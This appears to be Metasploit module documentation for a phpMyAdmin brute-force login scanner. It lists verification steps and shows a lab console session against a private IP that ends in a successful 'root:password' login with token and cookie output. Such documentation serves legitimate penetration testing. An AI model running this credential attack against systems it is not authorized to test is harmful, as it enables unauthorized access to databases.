
## Vulnerable Application

  This module is a brute-force login scanner for PhpMyAdmin 

## Verification Steps

  1. Start msfconsole
  2. Do: ```use [auxiliary/scanner/http/phpmyadmin_login]```
  3. Do: ```set RHOSTS [IP]```
  4. Do: ```set TARGETURI [URI]```
  5. Do: ```set PASSWORD [PASSWORD]```
  6. Do: ```run```
  7. You should get a successful login status

## Scenarios

### Tested on PhpMyAdmin Versions 4.8.2, 4.8.1, 4.0.10.20

  ```
  msf5 > use auxiliary/scanner/http/phpmyadmin_login
  msf5 auxiliary(scanner/http/phpmyadmin_login) > set rhosts 192.168.37.151
  rhosts => 192.168.37.151
  msf5 auxiliary(scanner/http/phpmyadmin_login) > set targeturi phpmyadmin-4.8.2/index.php
  targeturi => phpmyadmin-4.8.2/index.php
  msf5 auxiliary(scanner/http/phpmyadmin_login) > set password password
  password => password
  msf5 auxiliary(scanner/http/phpmyadmin_login) > run
  PhpMyAdmin Version: 4.8.2
  Token here: !il&>s3]t28i34x7
  Session ID: sruks7tm3bnh6jljb8h1q9gh6u
  Cookies: pma_lang=en; phpMyAdmin=anttidd9jgc8c2qnhn0kq4sshu;

  [+] 192.168.37.151:80 - Success: 'root:password'
  [*] Scanned 1 of 1 hosts (100% complete)
  [*] Auxiliary module execution completed
  msf5 auxiliary(scanner/http/phpmyadmin_login) > 

  ```
